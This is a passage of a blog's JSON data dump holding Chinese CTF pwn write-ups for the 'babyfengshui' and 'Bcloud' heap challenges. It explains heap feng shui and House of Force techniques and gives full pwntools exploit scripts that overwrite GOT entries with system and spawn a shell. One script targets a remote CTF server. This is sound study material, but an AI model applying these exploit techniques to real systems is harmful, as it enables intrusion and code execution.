class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">display</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update</span>(<span class=\"params\">idx,length,text</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text length: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add_user(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk0&#x27;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;nothing&#x27;</span>)</span><br><span class=\"line\">add_user(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk1&#x27;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;nothing&#x27;</span>)</span><br><span class=\"line\">add_user(<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;chunk2&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">del_user(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"string\">&#x27;this is got : &#x27;</span> + <span class=\"built_in\">hex</span>(elf.got[<span class=\"string\">&#x27;free&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_user(<span class=\"number\">0x108</span>,<span class=\"string\">&#x27;chunk0_0&#x27;</span>,<span class=\"number\">0x19c</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x198</span>+p32(elf.got[<span class=\"string\">&#x27;free&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">display(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;description: &#x27;</span>)</span><br><span class=\"line\">data=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&#x27;free&#x27;</span>,data)</span><br><span class=\"line\">libcbase=data-libc.dump(<span class=\"string\">&#x27;free&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> libcbase</span><br><span class=\"line\"></span><br><span class=\"line\">sys=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">update(<span class=\"number\">1</span>,<span class=\"number\">4</span>,p32(sys))</span><br><span class=\"line\">del_user(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>这是一个32位的堆题，堆风水。</p>","more":"<p>查壳<br><img src=\"C:\\Users\\95368\\Documents\\GitHub\\pwn-study-diary\\wp\\babyfengshui\\picture\\check.png\" alt=\"check\"></p>\n<p>是一个菜单，里面的user结构大概如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* description;<span class=\"comment\">//根据输入的size申请</span></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">124</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//在申请的0x80的chunk（user）中，第一个4byte是description的指针，后面存放的是name</span></span><br></pre></td></tr></table></figure>\n\n<p>在update函数中，有一个对堆溢出的检测</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 防止description的chunk溢出到该userchunk的size，但是可以溢出到pre_size</span></span><br><span class=\"line\"><span class=\"comment\">// 而且可能只有一开始chunk比较整齐的时候有用，若经过申请和释放description和user的chunk不连续，则失效</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">char</span> *)(length + *(_DWORD *)*(&amp;ptr + index)) &gt;= (<span class=\"type\">char</span> *)*(&amp;ptr + index) - <span class=\"number\">4</span> )</span><br><span class=\"line\">&#123;                                           </span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>if中条件的意思是：description中写的范围最多到该description的user的size位前。</p>\n<p>由于在add user的函数中，先malloc的是description的chunk，因此可以防止update时溢出到user的size以及后面的数据。</p>\n<p>但是，如果先申请的user被delete了，释放的user和description可能会在后续的过程中（甚至释放的时候）被合并，那么在后面申请新的user时，若合并后的部分不足以容纳新的description和user，则会造成description和其user并不连续，该防护就会不起作用，而我们要做的就是造成这种合并。</p>\n<p><strong>consolidate的机制（合并）</strong></p>\n<p>在malloc和free的时候都可能会出现合并的情况</p>\n<p><strong>malloc的情况：</strong></p>\n<p>malloc中的合并通常都是调用malloc_consolidate()函数对fast bins进行整理。当在small bins中查找时，若small bins尚未初始化，则合并fast bins中的chunk。当fast bins 和 small bins 中的chunk的大小都不能满足时，在large bins中查找，首先会调用malloc_consolidate()对进行fast bins chunk进行合并，可以合并的合并后放到unsorted bin，不能合并的直接放到unsorted bin中。如果top chunk也不能满足需求，会先调用malloc_consolidate()对fast bins chunk进行合并后再重新进行一次分配。</p>\n<p>malloc_consolidate()有两个作用：1.若fast bins未初始化，则初始化malloc_state;2.否则，合并fast bins中的chunk。</p>\n<p><strong>free的情况：</strong></p>\n<p>如果<strong>chunk的大小不在fast bin的范围内</strong>，free会尝试进行合并。合并首先考虑与<strong>物理低地址</strong>的相邻空闲chunk，再考虑<strong>物理高地址</strong>的相邻空闲chunk（两个chunk都不能是top chunk）。如果下一个chunk是top chunk，则当前chunk会合并到top chunk，并修改top chunk的大小。</p>\n<p>如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。</p>\n<p>对chunk进行合理的布局后，经过恰当的释放和申请，让新申请的description和user不连续，则可以在update函数实现堆溢出，在update函数中，从user的前4byte（description）指向的位置开始，可以写到该user的size字段前。</p>\n<p>在知道了这些之后，首先要考虑怎样才能<strong>泄露libc</strong>。</p>\n<p>在这道题目中，有display的功能，可以输出description的内容。其具体的过程是利用printf函数输出user的第一个4byte所指向的内容。这里原本存放的是description的指针，如果通过堆溢出将其<strong>修改为got表项的地址</strong>，则可以输出一个函数的真实地址，并由此得到libc。</p>\n<p>得到libc之后，就可以考虑如何<strong>get shell</strong>。</p>\n<p>在update中我们可以注意到，写入description是写入user的前4byte指向的位置。在一般情况下，这个指针指向的是description，但在我们泄露libc的过程中，我们其实是可以对其他user的description指针所在位置进行修改的。如果我们对这个指针修改后再执行update，对写入该指针指向的位置，利用这点，我们可以将某一函数的got表项覆盖为system函数。</p>\n<p>在此时，free函数就是个不错的选择，在delete user的时候，对调用free对user前四位指向的chunk进行释放，如果我们将free修改为system函数，并将要free的user的description设置为”/bin/sh\\x00”，则可以执行system(“/bin/sh\\x00”)。</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./babyfengshui&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./babyfengshui&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">28361</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_user</span>(<span class=\"params\">size,name,length,text</span>):</span><br><span class=\"line\">  p.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;size of description: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;name: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(name))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text length: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_user</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">display</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update</span>(<span class=\"params\">idx,length,text</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text length: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add_user(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk0&#x27;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;nothing&#x27;</span>)</span><br><span class=\"line\">add_user(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;chunk1&#x27;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;nothing&#x27;</span>)</span><br><span class=\"line\">add_user(<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;chunk2&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">del_user(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"string\">&#x27;this is got : &#x27;</span> + <span class=\"built_in\">hex</span>(elf.got[<span class=\"string\">&#x27;free&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_user(<span class=\"number\">0x108</span>,<span class=\"string\">&#x27;chunk0_0&#x27;</span>,<span class=\"number\">0x19c</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x198</span>+p32(elf.got[<span class=\"string\">&#x27;free&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">display(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;description: &#x27;</span>)</span><br><span class=\"line\">data=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&#x27;free&#x27;</span>,data)</span><br><span class=\"line\">libcbase=data-libc.dump(<span class=\"string\">&#x27;free&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> libcbase</span><br><span class=\"line\"></span><br><span class=\"line\">sys=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">update(<span class=\"number\">1</span>,<span class=\"number\">4</span>,p32(sys))</span><br><span class=\"line\">del_user(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"Bcloud","date":"2023-01-02T11:54:26.000Z","_content":"House of Force例题\n<!-- more -->\n\n32位堆题，菜单，NO PIE, Partial RELRO。\n\nHouse of Force\n\n### 主要漏洞点\n\n在get_input函数中有个off by null的漏洞，如果刚好写入size大小的内容则会触发。\n\n![get_input](./bcloud/get_input.jpg)\n\n### leak heapbase\n\n由get_input导致的问题，在input_name函数可以用来leak heapbase。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖，因此在后面的strcpy(v2,s)的时候会将v2的chunk地址一并copy到chunk中。在后续的welcome中会输出出来。\n\n![input_name](./bcloud/input_name.jpg)\n\n### 改写top chunk size\n\n在org_host函数中也有一样的问题，并且更加严重。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖。并且由于v2后面紧接着就是v3，而v2是写满4byte的一个地址，因此在后面的strcpy(v2,s)的时候会将**s的内容+v2的chunk地址+v3中的内容**一并copy到chunk中，而chunk大小只有0x44，因此会溢出到next chunk的size字段，而**下一个chunk就是top chunk，由此可以改写top chunk size**。\n\n![org_host](./bcloud/org_host.jpg)\n\n### 分配到chunk_list，获取任意写\n\n在改写了top chunk size之后，我们就可以利用House of Force实现**任意地址分配**了，之后我们考虑怎么利用这个任意地址分配。\n\nedit函数的功能是对chunk的content进行修改，其中取chunk是从bss段的chunk_list中按照id取出的，因此如果能够**改写chunk_list中的内容**，那么就可以实现**任意写**。\n\n要分配到chunk_list(0x804b120)，可以分配fake chunk(0x804b118)。我们要计算top chunk和fake chunk之间的偏移。top chunk的地址可以通过heapbase+offset计算得到。top chunk和fake chunk之间的偏移是 **-(top chunk - fake chunk)或0x10804b118-top chunk** 。malloc了这个大小的chunk后，下次malloc就能malloc到fake chunk了。\n\n### leak libc\n\n本题中没有edit函数，没办法输出。但是我们有任意写，可以**改写其他函数的GOT表项来调用函数输出**。\n\n此处可以改写delete功能中free函数的GOT表项为puts，再将chunk_list中对应的位置改为atoi的GOT表项的地址，就可以得到libcbase。\n\n### get shell\n\nget shell也是采用修改GOT表项的方法，将atoi的GOT表项修改为system，输入/bin/sh\\x00即可get shell。需要注意的是free了的id对应的chunk_list[id]和length_list[id]都会清0，虽然chunk_list[id]可以在我们申请到的fake chunk中修改，但length_list我们没有申请到，因此不能直接edit。\n\n\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='i386')\nelf=ELF(\"./pwn2\")\nlibc=ELF(\"./libc.so.6\")\np=process(\"./pwn2\")\n\ndef add(length,content):\n\tp.recvuntil('--->>\\n')\n\tp.sendline('1')\n\tp.recvuntil('Input the length of the note content:\\n')\n\tp.sendline(str(length))\n\tp.recvuntil('Input the content:\\n')\n\tp.sendline(str(content))\n\ndef edit(Id,content):\n\tp.recvuntil('--->>\\n')\n\tp.sendline('3')\n\tp.recvuntil('Input the id:\\n')\n\tp.sendline(str(Id))\n\tp.recvuntil('Input the new content:\\n')\n\tp.sendline(str(content))\n\ndef free(Id):\n\tp.recvuntil('--->>\\n')\n\tp.sendline('4')\n\tp.recvuntil('Input the id:\\n')\n\tp.sendline(str(Id))\n\n\n\ndef debug():\n\tgdb.attach(p,'x/8wx 0x804b120')\n\tpause()\n\n#leak heap base\np.recvuntil(\"Input your name:\\n\")\np.send('a'*0x40)\np.recvuntil('a'*0x40)\nheapbase=u32(p.recvuntil('!')[:-1].ljust(4,'\\x00'))-0x8\nprint(\"[*]heapbase: {:}\".format(hex(heapbase)))\n\n#overwrite top chunk size\np.recvuntil('Org:\\n')\np.send('a'*0x40)\np.recvuntil('Host:\\n')#overwrite\npayload=p32(0xffffffff)+'a'*0x3c\np.send(payload)\n\n#overwrite chunk_list\nchunk_list=0x0804B120\nfake_chunk=0x0804B118\ntop_chunk=heapbase+0xf8\n\nadd(0x10,'aaaa')\nadd(-(top_chunk-fake_chunk),'bbbb')\nadd(0x30,'cccc')#chunk_list[2]->chunk_list\n\n#leak libc\nedit(2,p32(elf.got['free'])+p32(elf.got['atoi'])+p32(elf.got['atoi']))\nedit(0,p32(elf.sym['puts']))#overwrite free@got to puts@plt \n\nfree(1)\n\natoi_addr=u32(p.recv(4))\nlibcbase=atoi_addr-libc.sym['atoi']\nprint(\"[*]libcbase: {:}\".format(hex(libcbase)))\n\n\n\n\n#get shell\n#overwrite atoi@got to system\nprint(hex(libcbase+libc.sym['system']))\n#debug()\nedit(2,p32(libcbase+libc.sym['system']))\n\n\np.sendline('/bin/sh\\x00')\n\np.interactive()\n```","source":"_posts/bcloud.md","raw":"---\ntitle: Bcloud\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- house_of_xxx\n---\nHouse of Force例题\n<!-- more -->\n\n32位堆题，菜单，NO PIE, Partial RELRO。\n\nHouse of Force\n\n### 主要漏洞点\n\n在get_input函数中有个off by null的漏洞，如果刚好写入size大小的内容则会触发。\n\n![get_input](./bcloud/get_input.jpg)\n\n### leak heapbase\n\n由get_input导致的问题，在input_name函数可以用来leak heapbase。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖，因此在后面的strcpy(v2,s)的时候会将v2的chunk地址一并copy到chunk中。在后续的welcome中会输出出来。\n\n![input_name](./bcloud/input_name.jpg)\n\n### 改写top chunk size\n\n在org_host函数中也有一样的问题，并且更加严重。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖。并且由于v2后面紧接着就是v3，而v2是写满4byte的一个地址，因此在后面的strcpy(v2,s)的时候会将**s的内容+v2的chunk地址+v3中的内容**一并copy到chunk中，而chunk大小只有0x44，因此会溢出到next chunk的size字段，而**下一个chunk就是top chunk，由此可以改写top chunk size**。\n\n![org_host](./bcloud/org_host.jpg)\n\n### 分配到chunk_list，获取任意写\n\n在改写了top chunk size之后，我们就可以利用House of Force实现**任意地址分配**了，之后我们考虑怎么利用这个任意地址分配。\n\nedit函数的功能是对chunk的content进行修改，其中取chunk是从bss段的chunk_list中按照id取出的，因此如果能够**改写chunk_list中的内容**，那么就可以实现**任意写**。\n\n要分配到chunk_list(0x804b120)，可以分配fake chunk(0x804b118)。我们要计算top chunk和fake chunk之间的偏移。top chunk的地址可以通过heapbase+offset计算得到。top chunk和fake chunk之间的偏移是 **-(top chunk - fake chunk)或0x10804b118-top chunk** 。malloc了这个大小的chunk后，下次malloc就能malloc到fake chunk了。\n\n### leak libc\n\n本题中没有edit函数，没办法输出。但是我们有任意写，可以**改写其他函数的GOT表项来调用函数输出**。\n\n此处可以改写delete功能中free函数的GOT表项为puts，再将chunk_list中对应的位置改为atoi的GOT表项的地址，就可以得到libcbase。\n\n### get shell\n\nget shell也是采用修改GOT表项的方法，将atoi的GOT表项修改为system，输入/bin/sh\\x00即可get shell。需要注意的是free了的id对应的chunk_list[id]和length_list[id]都会清0，虽然chunk_list[id]可以在我们申请到的fake chunk中修改，但length_list我们没有申请到，因此不能直接edit。\n\n\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='i386')\nelf=ELF(\"./pwn2\")\nlibc=ELF(\"./libc.so.6\")\np=process(\"./pwn2\")\n\ndef add(length,content):\n\tp.recvuntil('--->>\\n')\n\tp.sendline('1')\n\tp.recvuntil('Input the length of the note content:\\n')\n\tp.sendline(str(length))\n\tp.recvuntil('Input the content:\\n')\n\tp.sendline(str(content))\n\ndef edit(Id,content):\n\tp.recvuntil('--->>\\n')\n\tp.sendline('3')\n\tp.recvuntil('Input the id:\\n')\n\tp.sendline(str(Id))\n\tp.recvuntil('Input the new content:\\n')\n\tp.sendline(str(content))\n\ndef free(Id):\n\tp.recvuntil('--->>\\n')\n\tp.sendline('4')\n\tp.recvuntil('Input the id:\\n')\n\tp.sendline(str(Id))\n\n\n\ndef debug():\n\tgdb.attach(p,'x/8wx 0x804b120')\n\tpause()\n\n#leak heap base\np.recvuntil(\"Input your name:\\n\")\np.send('a'*0x40)\np.recvuntil('a'*0x40)\nheapbase=u32(p.recvuntil('!')[:-1].ljust(4,'\\x00'))-0x8\nprint(\"[*]heapbase: {:}\".format(hex(heapbase)))\n\n#overwrite top chunk size\np.recvuntil('Org:\\n')\np.send('a'*0x40)\np.recvuntil('Host:\\n')#overwrite\npayload=p32(0xffffffff)+'a'*0x3c\np.send(payload)\n\n#overwrite chunk_list\nchunk_list=0x0804B120\nfake_chunk=0x0804B118\ntop_chunk=heapbase+0xf8\n\nadd(0x10,'aaaa')\nadd(-(top_chunk-fake_chunk),'bbbb')\nadd(0x30,'cccc')#chunk_list[2]->chunk_list\n\n#leak libc\nedit(2,p32(elf.got['free'])+p32(elf.got['atoi'])+p32(elf.got['atoi']))\nedit(0,p32(elf.sym['puts']))#overwrite free@got to puts@plt \n\nfree(1)\n\natoi_addr=u32(p.recv(4))\nlibcbase=atoi_addr-libc.sym['atoi']\nprint(\"[*]libcbase: {:}\".format(hex(libcbase)))\n\n\n\n\n#get shell\n#overwrite atoi@got to system\nprint(hex(libcbase+libc.sym['system']))\n#debug()\nedit(2,p32(libcbase+libc.sym['system']))\n\n\np.sendline('/bin/sh\\x00')\n\np.interactive()\n```","slug":"bcloud","published":1,"updated":"2023-01-02T15:22:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafp002l5oud9lqbfzen","content":"<p>House of Force例题</p>\n<span id=\"more\"></span>\n\n<p>32位堆题，菜单，NO PIE, Partial RELRO。</p>\n<p>House of Force</p>\n<h3 id=\"主要漏洞点\"><a href=\"#主要漏洞点\" class=\"headerlink\" title=\"主要漏洞点\"></a>主要漏洞点</h3><p>在get_input函数中有个off by null的漏洞，如果刚好写入size大小的内容则会触发。</p>\n<p><img src=\"./bcloud/get_input.jpg\" alt=\"get_input\"></p>\n<h3 id=\"leak-heapbase\"><a href=\"#leak-heapbase\" class=\"headerlink\" title=\"leak heapbase\"></a>leak heapbase</h3><p>由get_input导致的问题，在input_name函数可以用来leak heapbase。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖，因此在后面的strcpy(v2,s)的时候会将v2的chunk地址一并copy到chunk中。在后续的welcome中会输出出来。</p>\n<p><img src=\"./bcloud/input_name.jpg\" alt=\"input_name\"></p>\n<h3 id=\"改写top-chunk-size\"><a href=\"#改写top-chunk-size\" class=\"headerlink\" title=\"改写top chunk size\"></a>改写top chunk size</h3><p>在org_host函数中也有一样的问题，并且更加严重。对s写满0x40，则其\\x00会溢出到v2的位置，在执行v2=malloc(0x40)后，这个\\x00会被覆盖。并且由于v2后面紧接着就是v3，而v2是写满4byte的一个地址，因此在后面的strcpy(v2,s)的时候会将<strong>s的内容+v2的chunk地址+v3中的内容</strong>一并copy到chunk中，而chunk大小只有0x44，因此会溢出到next chunk的size字段，而<strong>下一个chunk就是top chunk，由此可以改写top chunk size</strong>。</p>\n<p><img src=\"./bcloud/org_host.jpg\" alt=\"org_host\"></p>\n<h3 id=\"分配到chunk-list，获取任意写\"><a href=\"#分配到chunk-list，获取任意写\" class=\"headerlink\" title=\"分配到chunk_list，获取任意写\"></a>分配到chunk_list，获取任意写</h3><p>在改写了top chunk size之后，我们就可以利用House of Force实现<strong>任意地址分配</strong>了，之后我们考虑怎么利用这个任意地址分配。</p>\n<p>edit函数的功能是对chunk的content进行修改，其中取chunk是从bss段的chunk_list中按照id取出的，因此如果能够<strong>改写chunk_list中的内容</strong>，那么就可以实现<strong>任意写</strong>。</p>\n<p>要分配到chunk_list(0x804b120)，可以分配fake chunk(0x804b118)。我们要计算top chunk和fake chunk之间的偏移。top chunk的地址可以通过heapbase+offset计算得到。top chunk和fake chunk之间的偏移是 <strong>-(top chunk - fake chunk)或0x10804b118-top chunk</strong> 。malloc了这个大小的chunk后，下次malloc就能malloc到fake chunk了。</p>\n<h3 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h3><p>本题中没有edit函数，没办法输出。但是我们有任意写，可以<strong>改写其他函数的GOT表项来调用函数输出</strong>。</p>\n<p>此处可以改写delete功能中free函数的GOT表项为puts，再将chunk_list中对应的位置改为atoi的GOT表项的地址，就可以得到libcbase。</p>\n<h3 id=\"get-shell\"><a href=\"#get-shell\" class=\"headerlink\" title=\"get shell\"></a>get shell</h3><p>get shell也是采用修改GOT表项的方法，将atoi的GOT表项修改为system，输入/bin/sh\\x00即可get shell。需要注意的是free了的id对应的chunk_list[id]和length_list[id]都会清0，虽然chunk_list[id]可以在我们申请到的fake chunk中修改，但length_list我们没有申请到，因此不能直接edit。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 